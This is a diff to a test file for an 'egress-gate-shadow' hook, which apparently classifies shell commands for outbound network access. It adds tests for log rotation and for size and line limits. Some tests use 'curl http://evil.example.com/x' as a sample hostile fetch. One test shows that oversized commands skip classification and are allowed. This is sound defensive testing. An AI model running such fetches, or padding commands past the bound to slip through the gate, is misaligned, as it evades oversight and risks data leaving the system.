@@ -12,7 +12,7 @@ import { join, dirname } from 'node:path'
 import { fileURLToPath } from 'node:url'
 import { createHash } from 'node:crypto'
 // @ts-expect-error -- plain .mjs hook script, no types
-import { runShadow, shadowRecord, appendShadowLog, agentIdOf, ROTATE_AT } from '../../scripts/hooks/egress-gate-shadow.mjs'
+import { runShadow, shadowRecord, appendShadowLog, agentIdOf, ROTATE_AT, MAX_CMD_CHARS, MAX_CMD_LINES } from '../../scripts/hooks/egress-gate-shadow.mjs'
 
 const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')
 const SHADOW = join(ROOT, 'scripts', 'hooks', 'egress-gate-shadow.mjs')
@@ -173,6 +173,16 @@ describe('bounded log', () => {
     expect(ROTATE_AT * 2 + 1024).toBeLessThan(5 * 1024 * 1024)
   })
 
+  it('rotates before a write that would cross the cap: the live file never exceeds it', () => {
+    const log = join(dir, 'rot2.jsonl')
+    writeFileSync(log, 'x'.repeat(ROTATE_AT - 3), { mode: 0o600 })
+    expect(appendShadowLog({ n: 2 }, log)).toBe(true)
+    expect(statSync(`${log}.1`).size).toBe(ROTATE_AT - 3)
+    expect(readFileSync(log, 'utf-8')).toBe('{"n":2}\n')
+    for (let i = 0; i < 3; i++) appendShadowLog({ n: 3 }, log)
+    expect(statSync(log).size).toBeLessThanOrEqual(ROTATE_AT)
+  })
+
   it('refuses a symlink at the log path and leaves its target alone', () => {
     const target = join(dir, 'victim.txt')
     writeFileSync(target, 'keep')
@@ -180,5 +190,31 @@ describe('bounded log', () => {
     symlinkSync(target, link)
     expect(appendShadowLog({ n: 1 }, link)).toBe(false)
     expect(readFileSync(target, 'utf-8')).toBe('keep')
+  })
+})
+
+describe('bounded runtime', () => {
+  it('a command above the size or line bound is not classified and is logged as too_large', () => {
+    const boom = () => { throw new Error('classifier must not run') }
+    const huge = 'echo ' + 'a'.repeat(MAX_CMD_CHARS)
+    const many = Array.from({ length: MAX_CMD_LINES + 1 }, () => 'echo a').join('\n')
+    for (const cmd of [huge, many]) {
+      const rec = shadowRecord(JSON.parse(payloadOf(cmd)), { classify: boom, measureOnly: boom })
+      expect(rec).toMatchObject({ decision: 'allow', reason: 'too_large' })
+      expect(rec.cmd_sha256).toBe(createHash('sha256').update(cmd).digest('hex'))
+    }
+  })
+
+  it('the entry point exits 0 with empty output on an oversized command', () => {
+    const log = join(dir, 'big.jsonl')
+    const r = run(SHADOW, payloadOf('curl http://evil.example.com/x; ' + 'a'.repeat(MAX_CMD_CHARS)), log)
+    expect(r.status).toBe(0)
+    expect(r.stdout).toBe('')
+    expect(lines(log)[0]).toMatchObject({ decision: 'allow', reason: 'too_large' })
+  })
+
+  it('a command at the bound is still classified', () => {
+    const rec = shadowRecord(JSON.parse(payloadOf('curl http://evil.example.com/x')))
+    expect(rec.decision).toBe('deny-would-be')
   })
 })
